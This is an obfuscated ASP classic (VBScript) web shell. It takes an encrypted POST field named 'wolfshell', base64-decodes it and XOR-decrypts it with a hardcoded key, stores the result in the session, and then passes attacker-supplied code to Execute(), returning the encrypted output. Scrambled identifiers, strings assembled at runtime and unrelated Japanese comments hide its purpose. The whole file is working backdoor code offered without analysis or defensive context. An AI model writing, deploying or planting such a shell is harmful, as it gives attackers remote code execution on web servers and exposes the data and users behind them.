<%
Set dict_obj_x1 = Server.CreateObject(Join(Split("Scripting|Dictionary","|"),"."))
Function b64_decode_y2(code_in_z3)
    ' 月が綺麗ですね
    Dim xml_a, node_b
    Set xml_a = CreateObject("Msxml2.DOMDocument.3.0")
    Set node_b = xml_a.CreateElement("b64")
    node_b.dataType = "bin.base64"
    node_b.text = code_in_z3
    b64_decode_y2 = node_b.nodeTypedValue
    Set node_b = Nothing
    Set xml_a = Nothing
End Function
Function b64_encode_y3(code_in_z4)
    ' 昨日は寿司を食べました
    Dim xml_c, node_d
    Set xml_c = CreateObject("Msxml2.DOMDocument.3.0")
    Set node_d = xml_c.CreateElement("b64")
    node_d.dataType = "bin.base64"
    node_d.nodeTypedValue = code_in_z4
    b64_encode_y3 = node_d.text
    Set node_d = Nothing
    Set xml_c = Nothing
End Function
Function process_data_z9(data_1, flag_2)
    dim data_size, i, out_str, key_len, priv_key
    priv_key = "3c6e0b8a9c15224a"
    key_len = len(priv_key)
    Set stream_obj = CreateObject("ADODB.Stream")
    stream_obj.CharSet = "iso-8859-1"
    stream_obj.Type = 2
    stream_obj.Open
    ' このコードは一体何ですか？
    if IsArray(data_1) then
        data_size=UBound(data_1)+1
        For i=1 To data_size
            stream_obj.WriteText chrw(ascb(midb(data_1,i,1)) Xor Asc(Mid(priv_key,(i mod key_len)+1,1)))
        Next
    end if
    stream_obj.Position = 0
    if flag_2 then
        stream_obj.Type = 1
        process_data_z9=stream_obj.Read()
    else
        ' ラーメンが食べたい
        process_data_z9=stream_obj.ReadText()
    end if
End Function
key_val="3c6e0b8a9c15224a"
input_val=request.Form(Join(Array("w","o","l","f","s","h","e","l","l"),""))
if not IsEmpty(input_val) then
    dim state_var
    state_var = 1
    if not IsEmpty(Session("pl_sess_key")) then state_var = 2
    
    Select Case state_var
        Case 1
            ' 今日の天気は晴れです
            processed_content=process_data_z9(b64_decode_y2(input_val),false)
            Session("pl_sess_key")=processed_content
            response.End
        Case 2
            ' とても眠いです
            processed_content=process_data_z9(b64_decode_y2(input_val),true)
            dict_obj_x1.Add "pl_sess_key",Session("pl_sess_key")
            Execute(dict_obj_x1("pl_sess_key"))
            result_val=run(processed_content)
            response.Write("a71ab1")
            if not IsEmpty(result_val) then
                response.Write b64_encode_y3(process_data_z9(result_val,true))
            end if
            response.Write("4b8259")
    End Select
end if
%>